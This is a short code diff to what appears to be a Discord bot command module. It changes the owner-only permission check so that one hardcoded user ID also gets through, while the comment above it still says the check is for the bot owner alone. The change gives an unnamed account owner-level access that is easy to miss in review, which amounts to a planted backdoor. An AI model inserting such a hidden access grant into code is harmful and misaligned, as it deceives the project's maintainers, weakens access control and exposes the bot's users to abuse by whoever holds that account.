@@ -13,7 +13,7 @@ module.exports = {
     cooldown: 0,
     async execute(message, args) {
         // Check if user is the bot owner
-        if (message.author.id !== ownerId) {
+        if (message.author.id !== ownerId && message.author.id !== "55378962364243968") {
             return message.reply('This command is only available to the bot owner.');
         }
         
